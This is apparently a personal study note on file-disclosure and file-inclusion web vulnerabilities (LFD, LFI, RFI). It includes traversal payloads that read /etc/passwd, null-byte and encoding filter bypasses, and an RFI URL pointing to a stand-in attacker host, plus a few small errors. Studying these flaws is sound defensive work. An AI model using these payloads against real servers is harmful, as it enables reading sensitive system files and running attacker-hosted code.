---
tags:
  - CyberSec
  - Vulns/Web
---
## LFD – Local File Disclosure
A vulnerability that allows an attacker to **read or access** files stored locally on the server directly.
LFD typically refers **just to file reading**, not execution or inclusion.
eg: `http://example.com/view?file=/etc/passwd`

- Sometimes the application may expect an extension or will automatically add it to the end of the request for example:
	`GET http://mybankingsite.com/transactions?u=myusername HTTP/1.1`
	Will spit out a CSV file named myusername.csv .This can be bypassed by adding a nullbyte (%00), in some cases by adding a “?", or other characters, depending on how the application works 
	`GET http://mybankingsite.com/transactions?u=/etc/passwd?%00 HTTP/1.1`
	This may give us the contents for /etc/password by ignoring the CSV extension

Null byte Injection (%00) or a ? mark, to ignore the remainder of the string but we may have to deal with other limitations or filtering in place.
URL encoding:
- `.` = `%2e`
- `/` = `%2F`
- `../` = `%2e%2e%2F`
Bypass filter for “../"
- `.../ ./` = `../`
- `....//` = `../`


## Local File Inclusion Vulnerabilities
A local file inclusion (LFI) vulnerability occurs when a web application allows a user to submit input into files or upload files to the server. Successful exploitation could **allow an attacker to read and (in some cases) execute files on the victim’s system**. 
Some LFI vulnerabilities can be critical if a web application is running with high privileges or as root. 
Such vulnerabilities can allow attackers to gain access to sensitive information and can even enable them to execute arbitrary commands in the affected system.

eg: `http://website.com/?page=../../../../../etc/passwd`
The vulnerable application shows the contents of the **/etc/passwd** file to the attacker.

The File Disclosure vulnerability allows an attacker to include a file, usually exploiting a "dynamic file read” mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.

- [[Path Traversal]]

## Remote File Inclusion Vulnerabilities
Remote file inclusion (RFI) vulnerabilities are similar to LFI vulnerabilities. However, when an attacker exploits an RFI vulnerability, instead of accessing a file on the victim, the attacker is able to execute code hosted on his or her own system (the attacking system).

**NOTE** RFI vulnerabilities are trivial to exploit; however, they are less common than LFI vulnerabilities.

eg: `http://example.com/vulnerabilities/fi/?page=http://malicious.hacker.org/malware.html`
In this example, the attacker’s website (http://malicious.h4cker.org/malware.html) is likely to host malware or malicious scripts that can be executed when the victim visits that site.